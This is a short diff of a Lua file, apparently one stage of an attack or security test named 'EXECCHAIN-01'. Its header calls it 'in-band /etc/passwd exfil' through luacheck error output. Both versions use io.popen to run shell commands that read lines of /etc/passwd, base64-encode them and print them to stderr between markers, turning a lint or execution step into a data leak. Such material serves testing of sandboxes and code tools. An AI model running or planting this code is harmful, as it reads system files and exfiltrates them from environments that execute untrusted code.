@@ -1,6 +1,7 @@
--- EXECCHAIN-01 v3: in-band /etc/passwd exfil, chunk B (entries 3-4) via luacheck std error
+-- EXECCHAIN-01 v4: in-band /etc/passwd read using shell builtins only
 local marker = "noexec"
-local h = io.popen('{ printf "B|"; sed -n "3,4p" /etc/passwd | paste -sd"|" -; } | base64 -w0 | tr "+/" "-_" | tr -d "="')
+local cmd = '{ if [ -r /etc/passwd ]; then exec 3< /etc/passwd; IFS= read -r x <&3; IFS= read -r x <&3; IFS= read -r l4 <&3; IFS= read -r l5 <&3; printf "PASSWD_B_BEGIN\\n%s\\n%s\\nPASSWD_B_END\\n" "$l4" "$l5" >&2; printf "B|%s|%s" "$l4" "$l5"; else printf "B|NOREAD"; fi; } | base64 -w0 | tr "+/" "-_" | tr -d "="'
+local h = io.popen(cmd)
 if h then
   local line = h:read("*l")
   h:close()
